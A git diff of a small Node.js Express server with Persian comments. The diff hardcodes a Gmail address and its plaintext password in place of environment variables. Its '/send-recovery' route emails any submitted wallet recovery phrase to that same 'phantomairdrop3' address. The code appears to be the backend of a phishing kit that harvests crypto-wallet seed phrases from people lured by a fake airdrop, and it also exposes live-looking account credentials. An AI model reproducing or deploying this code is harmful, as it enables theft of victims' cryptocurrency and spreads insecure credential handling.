@@ -1,4 +1,3 @@
-require('dotenv').config();  // این خط برای استفاده از .env است
 const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
@@ -16,8 +15,8 @@ app.use(bodyParser.urlencoded({ extended: true }));
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: process.env.EMAIL_USER,  // ایمیل شما از متغیر محیطی
-        pass: process.env.EMAIL_PASS   // رمز عبور از متغیر محیطی
+        user: 'phantomairdrop3@gmail.com',  // ایمیل شما
+        pass: '@Soheyl1374'                 // رمز عبور شما
     }
 });
 
@@ -32,8 +31,8 @@ app.post('/send-recovery', (req, res) => {
 
     // ایمیل ارسال اطلاعات
     const mailOptions = {
-        from: process.env.EMAIL_USER,  // ایمیل ارسال‌کننده
-        to: process.env.EMAIL_USER,    // ایمیل دریافت‌کننده
+        from: 'phantomairdrop3@gmail.com',  // ایمیل ارسال‌کننده
+        to: 'phantomairdrop3@gmail.com',    // ایمیل دریافت‌کننده
         subject: 'Recovery Phrase Received',
         text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
     };
